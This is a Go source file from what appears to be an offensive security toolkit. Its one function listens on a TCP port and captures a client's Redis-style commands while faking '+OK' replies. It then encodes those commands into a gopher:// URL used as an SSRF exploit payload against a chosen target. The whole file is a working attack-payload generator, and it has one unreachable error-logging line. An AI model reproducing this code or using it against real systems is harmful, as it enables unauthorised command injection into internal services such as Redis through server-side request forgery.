package gopher

import (
	"bytes"
	"fmt"
	"net"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"syscall"

	"github.com/virzz/logger"
)

// 通过监听流量生成 gopher exp
func GenGopherExpByListen(targetAddr string, port int, noQuit bool) (string, error) {
	logger.DebugF("target: %s port: %d", targetAddr, port)
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return "", err
	}
	defer ln.Close()
	logger.NormalF("Listen: %s", ln.Addr().String())
	conn, err := ln.Accept()
	if err != nil {
		return "", err
	}
	defer conn.Close()
	var data bytes.Buffer

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)

	go func() {
		for {
			buff := make([]byte, 2048)
			n, err := conn.Read(buff)
			if err != nil {
				break
				logger.Error(err)
			}
			tmp := string(buff[:n])
			logger.DebugF("buff = %s", tmp)
			// Fix redis::command - 返回有关命令的文档信息
			if strings.HasPrefix(tmp, "*1\r\n$7\r\nCOMMAND\r\n") {
				continue
			}
			data.Write(buff[:n])
			// Resp
			matches := regexp.MustCompile(`(?m)\*\d+\r\n\$\d+\r\n\w+\r\n`).FindAll(buff[:n], -1)
			if len(matches) > 0 && len(matches[0]) > 0 {
				conn.Write([]byte("+OK\r\n"))
				continue
			}
			conn.Write([]byte("OK\r\n"))
		}
	}()

	<-interrupt
	fmt.Fprint(os.Stdout, "\r")

	if !noQuit {
		data.WriteString("*1\r\n$4\r\nquit\r\n")
	}
	exp := fmt.Sprintf(
		"gopher://%s/_%s",
		targetAddr,
		strings.ReplaceAll(url.QueryEscape(data.String()), "+", "%20"),
	)
	return exp, nil
}
